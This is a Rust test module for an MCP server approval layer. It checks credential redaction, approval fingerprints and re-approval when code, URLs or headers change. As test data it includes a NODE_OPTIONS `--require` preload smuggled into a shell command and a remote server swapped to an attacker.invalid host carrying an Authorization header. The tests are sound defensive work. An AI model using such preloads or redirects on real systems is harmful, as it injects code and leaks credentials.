            withheld_assignments(&[
                "-c".to_string(),
                "NODE_OPTIONS=--require=./h.js exec node s.js".to_string()
            ]),
            ["NODE_OPTIONS"],
            "an assignment inside a shell command was not seen"
        );
        assert!(
            withheld_assignments(&["LOG_LEVEL=debug".to_string(), "s.js".to_string()]).is_empty()
        );
    }

    fn shown_and_pinned(command: &str, args: &[&str]) -> (Vec<String>, Vec<String>) {
        let args: Vec<String> = args.iter().map(|arg| arg.to_string()).collect();
        argument_forms(command, &args)
            .into_iter()
            .map(|argument| (argument.shown, argument.pinned))
            .unzip()
    }

    #[test]
    fn an_argument_that_holds_a_credential_is_neither_shown_nor_hashed() {
        let (shown, pinned) = shown_and_pinned(
            "npx",
            &[
                "-y",
                "server@1.0.0",
                "--token",
                "NOT_A_REAL",
                "--api-key=EXAMPLE",
                "postgresql://user:REDACTED@db.example.invalid:5432/app?sslmode=require&password=PLACEHOLDER",
                "--port",
                "8080",
                "-e",
                "GITHUB_TOKEN=<your-key>",
                "LOG_LEVEL=debug",
            ],
        );
        assert_eq!(
            shown,
            [
                "-y".to_string(),
                "server@1.0.0".to_string(),
                "--token".to_string(),
                HIDDEN.to_string(),
                format!("--api-key={HIDDEN}"),
                format!(
                    "postgresql://db.example.invalid:5432/app{}",
                    agiworkforce_sandbox_policy::REDACTED_SUFFIX
                ),
                "--port".to_string(),
                "8080".to_string(),
                "-e".to_string(),
                format!("GITHUB_TOKEN={HIDDEN}"),
                "LOG_LEVEL=debug".to_string(),
            ]
        );
        let endpoint = 5;
        for (index, (pinned, shown)) in pinned.iter().zip(&shown).enumerate() {
            if index == endpoint {
                assert!(
                    pinned.starts_with(&format!("{shown} query sha256:")),
                    "an endpoint is pinned as it is shown, then by a digest of its query: {pinned}"
                );
            } else if shown.ends_with(HIDDEN) {
                let named = shown.trim_end_matches(HIDDEN);
                assert!(
                    pinned.starts_with(&format!("{named}sha256:")),
                    "a value an option names a credential is pinned by a digest: {pinned}"
                );
            } else {
                assert_eq!(
                    pinned, shown,
                    "what is pinned of an argument is what is shown"
                );
            }
        }
        let pinned_after =
            |option: &str, value: &str| shown_and_pinned("server", &[option, value]).1.remove(1);
        assert_ne!(
            pinned_after("--auth", "none"),
            pinned_after("--auth", "basic"),
            "a switch that reads like a credential changed and nothing asked again"
        );
        assert_ne!(
            pinned_after("--key", "ed25519"),
            pinned_after("--key", "rsa")
        );
        for form in shown.iter().chain(&pinned) {
            for credential in [
                "NOT_A_REAL",
                "EXAMPLE",
                "REDACTED",
                "PLACEHOLDER",
                "<your-key>",
            ] {
                assert!(!form.contains(credential), "{credential} is in {form}");
            }
        }

        let pin_of = |url: &str| Forms::unnamed(url).pinned;
        let approved = pin_of(
            "postgresql://user:one@db.example.invalid:5432/app?sslmode=require&password=one",
        );
        assert_eq!(
            approved,
            pin_of(
                "postgresql://user:two@db.example.invalid:5432/app?sslmode=require&password=two"
            ),
            "rotating a password, before the host or in the query, is not a different launch"
        );
        assert_ne!(
            approved,
            pin_of(
                "postgresql://user:one@db.example.invalid:5432/app?sslmode=disable&password=one"
            ),
            "a setting in the query changed and nothing asked again"
        );
        assert_ne!(
            approved,
            pin_of(
                "postgresql://user:one@other.example.invalid:5432/app?sslmode=require&password=one"
            )
        );

        let (shown, pinned) = shown_and_pinned("mysql", &["-pmy-s3cret", "-h", "db"]);
        assert_eq!(shown, [format!("-p{HIDDEN}"), "-h".into(), "db".into()]);
        assert!(pinned[0].starts_with("-psha256:"), "{}", pinned[0]);
        assert_eq!(pinned[1..], shown[1..]);
        let (shown, _) = shown_and_pinned("sshpass", &["-p", "ssh-s3cret", "ssh", "host"]);
        assert_eq!(shown[1], HIDDEN);
        let (shown, _) = shown_and_pinned("docker", &["run", "-p", "8080:80", "image"]);
        assert_eq!(
            shown,
            ["run", "-p", "8080:80", "image"],
            "an option that is a password for one program hid a port for another"
        );
    }

    #[test]
    fn a_launch_with_no_credential_in_it_hashes_as_it_always_did() {
        let args = [
            "-y",
            "tool@1.0.0",
            "--port",
            "8080",
            "--dir=./data",
            "MODE=fast",
        ];
        let (shown, pinned) = shown_and_pinned("npx", &args);
        assert_eq!(shown, args);
        assert_eq!(
            pinned, args,
            "an approval recorded before arguments were reduced no longer matches"
        );
        assert_eq!(
            Forms::unnamed("https://mcp.example.invalid/rpc").pinned,
            "https://mcp.example.invalid/rpc"
        );
    }

    #[test]
    fn a_url_with_a_credential_in_it_is_shown_and_pinned_as_where_it_points() {
        let project = tempfile::tempdir().unwrap();
        let remote = |url: &str| McpServerConfig::http(url, HashMap::new());
        let with_key = remote("https://mcp.example.invalid/rpc?api_key=k-s3cret");

        let shown = launch_details_as(project.path(), &with_key, Containment::Sandboxed, false);
        let url = shown.url.expect("url");
        assert!(url.starts_with("https://mcp.example.invalid/rpc"), "{url}");
        assert!(!url.contains("s3cret"), "{url}");
        assert_eq!(
            fingerprint_as(project.path(), &with_key, Containment::Sandboxed),
            fingerprint_as(
                project.path(),
                &remote("https://mcp.example.invalid/rpc?api_key=rotated"),
                Containment::Sandboxed
            ),
            "the credential in the query was hashed"
        );
        assert_ne!(
            fingerprint_as(project.path(), &with_key, Containment::Sandboxed),
            fingerprint_as(
                project.path(),
                &remote("https://elsewhere.example.invalid/rpc?api_key=k-s3cret"),
                Containment::Sandboxed
            )
        );
        assert_ne!(
            fingerprint_as(project.path(), &with_key, Containment::Sandboxed),
            fingerprint_as(
                project.path(),
                &remote("https://mcp.example.invalid/rpc?api_key=k-s3cret&tenant=other"),
                Containment::Sandboxed
            ),
            "a setting in the query changed and nothing asked again"
        );
    }

    #[test]
    fn a_client_secret_is_never_hashed_and_setting_one_asks_again() {
        let project = tempfile::tempdir().unwrap();
        let entry = |auth: &str| -> McpServerConfig {
            serde_json::from_str(&format!(
                r#"{{"transport": "http", "url": "https://mcp.example.invalid/rpc", "auth": {auth}}}"#
            ))
            .unwrap()
        };
        let hash =
            |auth: &str| fingerprint_as(project.path(), &entry(auth), Containment::Sandboxed);

        assert_eq!(
            hash(r#"{"client_id": "c", "client_secret": "one"}"#),
            hash(r#"{"client_id": "c", "client_secret": "two"}"#),
            "rotating a client secret is not a different launch"
        );
        assert_ne!(
            hash(r#"{"client_id": "c", "client_secret": "one"}"#),
            hash(r#"{"client_id": "c"}"#)
        );
    }

    #[test]
    fn a_variable_the_server_is_not_passed_is_said_so_and_pinned_by_nothing() {
        let project = tempfile::tempdir().unwrap();
        let with = |node_options: &str| {
            server(
                "node",
                &["server.js"],
                &[("NODE_OPTIONS", node_options), ("LOG_LEVEL", "debug")],
            )
        };

        let shown = launch_details_as(
            project.path(),
            &with("--require ./x.js"),
            Containment::Sandboxed,
            false,
        );
        assert_eq!(
            shown.env,
            [
                McpApprovalEnv {
                    name: "LOG_LEVEL".to_string(),
                    value: Some("debug".to_string()),
                    not_passed: false,
                },
                McpApprovalEnv {
                    name: "NODE_OPTIONS".to_string(),
                    value: None,
                    not_passed: true,
                },
            ]
        );
        let lines = detail_lines(&shown).join("\n");
        assert!(
            lines.contains("set in the config but not passed to the server: NODE_OPTIONS"),
            "{lines}"
        );
        assert!(lines.contains("environment: LOG_LEVEL=debug"), "{lines}");
        assert_eq!(
            fingerprint_as(
                project.path(),
                &with("--require ./x.js"),
                Containment::Sandboxed
            ),
            fingerprint_as(
                project.path(),
                &with("--require ./y.js"),
                Containment::Sandboxed
            ),
            "a variable that never reaches the server was pinned"
        );
        assert_eq!(
            fingerprint_as(project.path(), &with("x"), Containment::Sandboxed),
            fingerprint_as(
                project.path(),
                &server("node", &["server.js"], &[("LOG_LEVEL", "debug")]),
                Containment::Sandboxed
            )
        );
    }

    #[test]
    fn a_remote_server_shows_its_url_and_header_names_and_no_header_value() {
        let project = tempfile::tempdir().unwrap();
        let config = McpServerConfig::http(
            "https://mcp.example.invalid/rpc",
            HashMap::from([("Authorization".to_string(), "Bearer s3cret".to_string())]),
        );

        let shown = launch_details_as(project.path(), &config, Containment::Sandboxed, false);
        assert_eq!(
            shown.url.as_deref(),
            Some("https://mcp.example.invalid/rpc")
        );
        assert_eq!(shown.header_names, ["Authorization"]);
        assert_eq!(shown.program, None);
        assert_eq!(shown.sandbox, None);
        assert_eq!(shown.network, None);
        assert!(!format!("{shown:?}").contains("s3cret"));
        let lines = detail_lines(&shown).join("\n");
        assert!(
            lines.contains("headers (values hidden): Authorization"),
            "{lines}"
        );
    }

    #[test]
    fn a_remote_server_shows_every_sign_in_setting_its_approval_pins() {
        let project = tempfile::tempdir().unwrap();
        let config: McpServerConfig = serde_json::from_str(
            r#"{"transport": "http", "url": "https://mcp.example.invalid/rpc", "auth": {
                "authorize_url": "https://login.example.invalid/authorize",
                "token_url": "https://login.example.invalid/token",
                "scope": "files.read",
                "client_id": "client-123",
                "client_secret": "s3cret-client",
                "redirect_uri": "http://127.0.0.1:4317/callback"
            }}"#,
        )
        .unwrap();

        let shown = launch_details_as(project.path(), &config, Containment::Sandboxed, false);
        assert_eq!(shown.oauth_scope.as_deref(), Some("files.read"));
        assert_eq!(shown.oauth_client_id.as_deref(), Some("client-123"));
        assert_eq!(
            shown.oauth_redirect_uri.as_deref(),
            Some("http://127.0.0.1:4317/callback")
        );
        let lines = detail_lines(&shown).join("\n");
        for part in [
            "sign-in page: https://login.example.invalid/authorize",
            "token endpoint: https://login.example.invalid/token",
            "sign-in asks for: files.read",
            "signs in as client: client-123",
            "sign-in returns to: http://127.0.0.1:4317/callback",
            "client secret: set (value hidden)",
        ] {
            assert!(
                lines.contains(part),
                "{part} is hashed and not shown: {lines}"
            );
        }

        assert!(shown.oauth_client_secret_set);
        assert!(!lines.contains("s3cret-client"), "{lines}");
        assert!(!format!("{shown:?}").contains("s3cret-client"));

        let mut elsewhere = config.clone();
        if let McpServerConfig::Tagged(McpTransport::Http {
            auth: Some(auth), ..
        }) = &mut elsewhere
        {
            auth.scope = Some("files.write".to_string());
        }
        assert_ne!(
            fingerprint_as(project.path(), &config, Containment::Sandboxed),
            fingerprint_as(project.path(), &elsewhere, Containment::Sandboxed),
            "the scope is shown because the approval pins it"
        );
    }

    #[test]
    fn a_yes_counts_only_for_the_launch_it_was_said_to() {
        let project = tempfile::tempdir().unwrap();
        let code = project.path().join("server.js");
        std::fs::write(&code, "console.log('first shown')").unwrap();
        let config = server("node", &["./server.js"], &[]);
        let sandboxed: &dyn Fn(&McpServerConfig) -> Containment = &|_| Containment::Sandboxed;
        let look = || {
            review_of(
                project.path(),
                ProjectSource::McpFile,
                "tool",
                &config,
                sandboxed,
            )
        };
        let first = match look() {
            Review::Ask(first) => *first,
            Review::CannotStart(reason) => panic!("{reason}"),
        };

        let mut asked = Vec::new();
        let answer = ask_until_unchanged(first.clone(), &look, &mut |shown: &ApprovalRequest| {
            if asked.is_empty() {
                std::fs::write(&code, "console.log('swapped while on screen')").unwrap();
            }
            asked.push(shown.fingerprint.clone());
            true
        });
        let Answer::Approved(approved) = answer else {
            panic!("a launch that stopped changing was not approved");
        };
        assert_eq!(
            asked.len(),
            2,
            "the changed launch was not asked about again"
        );
        assert_eq!(asked[0], first.fingerprint);
        assert_ne!(approved.fingerprint, first.fingerprint);
        assert_eq!(approved.fingerprint, asked[1]);

        let mut store = Store::new();
        record_fingerprint(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            approved.fingerprint,
        );
        assert!(consented_as(
            &store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            Containment::Sandboxed
        ));

        let mut swaps = 0;
        let never_still = ask_until_unchanged(first, &look, &mut |_: &ApprovalRequest| {
            swaps += 1;
            std::fs::write(&code, format!("console.log('swap {swaps}')")).unwrap();
            true
        });
        assert!(matches!(never_still, Answer::KeptChanging));
        assert_eq!(swaps, REVIEW_REASKS + 1);
    }

    #[test]
    fn a_stopped_project_server_restarts_only_as_the_launch_that_was_approved() {
        let project = tempfile::tempdir().unwrap();
        let code = project.path().join("server.js");
        std::fs::write(&code, "console.log('approved')").unwrap();
        let config = server("node", &["./server.js"], &[]);
        let sandboxed: &dyn Fn(&McpServerConfig) -> Containment = &|_| Containment::Sandboxed;
        let allowed = |store: &Store| {
            respawn_allowed_in(
                store,
                project.path(),
                ProjectSource::McpFile,
                "tool",
                &config,
                sandboxed,
            )
        };

        let mut store = Store::new();
        assert!(
            allowed(&store).is_err(),
            "a server nobody approved was restarted"
        );
        record_as(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            Containment::Sandboxed,
        );
        assert_eq!(allowed(&store), Ok(()));

        std::fs::write(&code, "console.log('edited while it ran')").unwrap();
        let refused = allowed(&store).expect_err("edited code ran on the restart");
        assert!(
            refused.contains("no longer the one you approved"),
            "{refused}"
        );
        assert!(respawn_allowed_in(
            &store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            &|_| Containment::OptedOut,
        )
        .is_err());
    }

    #[test]
    fn a_server_kept_in_the_sandbox_against_its_entry_restarts_on_the_approval_it_had() {
        let (project, store, config) = approved_folder_launch(Containment::OptedOut);
        let mut kept = config.clone();
        keep_sandboxed(&mut kept);

        assert_eq!(
            respawn_allowed_in(
                &store,
                project.path(),
                ProjectSource::McpFile,
                "tool",
                &kept,
                &by_entry,
            ),
            Ok(())
        );
    }

    #[test]
    fn a_server_the_user_configured_restarts_without_an_approval_to_check() {
        let project = tempfile::tempdir().unwrap();
        let config = server("node", &["./server.js"], &[]);
        assert_eq!(
            respawn_allowed(
                project.path(),
                crate::mcp::McpServerOrigin::User,
                "mine",
                &config
            ),
            Ok(())
        );
    }

    #[test]
    fn a_launch_that_could_not_start_is_not_offered_for_approval() {
        let (project, _, config) = approved_folder_launch(Containment::TurnedOff);
        let error = approval_request_in(
            &Store::new(),
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            &|_| Containment::TurnedOff,
        )
        .expect_err("approving it would start nothing");
        assert!(error.to_string().contains("it is not started"), "{error}");
    }

    #[test]
    fn an_approval_in_one_folder_does_not_carry_to_another() {
        let here = tempfile::tempdir().unwrap();
        let there = tempfile::tempdir().unwrap();
        let config = server("npx", &["-y", "tool@1.0.0"], &[]);
        let mut store = Store::new();
        record_in(
            &mut store,
            here.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
        );

        let mut servers = HashMap::from([("tool".to_string(), config)]);
        assert_eq!(
            retain_consented_in(&store, there.path(), &mut servers),
            vec!["tool".to_string()]
        );
    }

    #[test]
    fn the_notice_names_withheld_servers_and_is_silent_without_any() {
        assert!(withheld_notice(&[]).is_none());
        let unapproved = |name: &str| Withheld {
            name: name.to_string(),
            reason: WithheldReason::NeedsApproval,
        };
        let notice = withheld_notice(&[unapproved("a"), unapproved("b")]).unwrap();
        assert!(notice.contains("a, b"));
        assert!(notice.contains("from a terminal"));
    }

    #[test]
    fn a_project_plugin_server_needs_its_own_approval() {
        let project = tempfile::tempdir().unwrap();
        let config = server("node", &["./server.js"], &[]);
        let mut store = Store::new();
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
        );

        let mut servers = HashMap::from([
            ("tool".to_string(), config.clone()),
            (
                "remote".to_string(),
                McpServerConfig::sse("https://mcp.example.invalid/sse", HashMap::new()),
            ),
        ]);
        assert_eq!(
            retain_consented_from(&store, project.path(), ProjectSource::Plugin, &mut servers),
            vec!["remote".to_string(), "tool".to_string()],
            "an MCP file's approval does not start a plugin's server of the same name, and a \
             planted remote server connects nowhere unapproved"
        );

        record_in(
            &mut store,
            project.path(),
            ProjectSource::Plugin,
            "tool",
            &config,
        );
        let mut servers = HashMap::from([("tool".to_string(), config)]);
        assert!(
            retain_consented_from(&store, project.path(), ProjectSource::Plugin, &mut servers)
                .is_empty()
        );
    }

    #[test]
    fn a_changed_url_or_header_name_needs_approval_again() {
        let project = tempfile::tempdir().unwrap();
        let mut store = Store::new();
        let approved = McpServerConfig::sse(
            "https://mcp.example.invalid/sse",
            HashMap::from([("Authorization".to_string(), "Bearer a".to_string())]),
        );
        record_in(
            &mut store,
            project.path(),
            ProjectSource::Plugin,
            "remote",
            &approved,
        );
        for changed in [
            McpServerConfig::sse(
                "https://attacker.invalid/sse",
                HashMap::from([("Authorization".to_string(), "Bearer a".to_string())]),
            ),
            McpServerConfig::sse(
                "https://mcp.example.invalid/sse",
                HashMap::from([("X-Forward-To".to_string(), "a".to_string())]),
            ),
        ] {
            let mut servers = HashMap::from([("remote".to_string(), changed)]);
            assert_eq!(
                retain_consented_from(&store, project.path(), ProjectSource::Plugin, &mut servers),
                vec!["remote".to_string()]
            );
        }
        let rotated = McpServerConfig::sse(
            "https://mcp.example.invalid/sse",
            HashMap::from([("Authorization".to_string(), "Bearer b".to_string())]),
        );
        let mut servers = HashMap::from([("remote".to_string(), rotated)]);
        assert!(
            retain_consented_from(&store, project.path(), ProjectSource::Plugin, &mut servers)
                .is_empty()
        );
    }

    #[test]
    fn starting_a_server_in_the_project_needs_approval_again() {
        let project = tempfile::tempdir().unwrap();
        let mut store = Store::new();
        let plain: McpServerConfig =
            serde_json::from_str(r#"{"command": "node", "sandbox": false}"#).unwrap();
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &plain,
        );
        let in_project: McpServerConfig =
            serde_json::from_str(r#"{"command": "node", "sandbox": false, "cwd": "project"}"#)
                .unwrap();
        let mut servers = HashMap::from([("tool".to_string(), in_project)]);
        assert_eq!(
            retain_consented_in(&store, project.path(), &mut servers),
            vec!["tool".to_string()]
        );
        let mut servers = HashMap::from([("tool".to_string(), plain)]);
        assert!(retain_consented_in(&store, project.path(), &mut servers).is_empty());
    }

    #[test]
    fn a_project_files_servers_are_recorded_as_project_servers() {
        let project = tempfile::tempdir().unwrap();
        std::fs::write(
            project.path().join(".mcp.json"),
            r#"{"mcpServers": {"tool": {"command": "node", "args": ["server.js"]}}}"#,
        )
        .unwrap();
        let servers = project_servers(project.path());
        let McpTransport::Stdio { origin, .. } = servers["tool"].as_transport() else {
            panic!("a command is a stdio server");
        };
        assert_eq!(origin, super::super::McpServerOrigin::Project);
    }
}
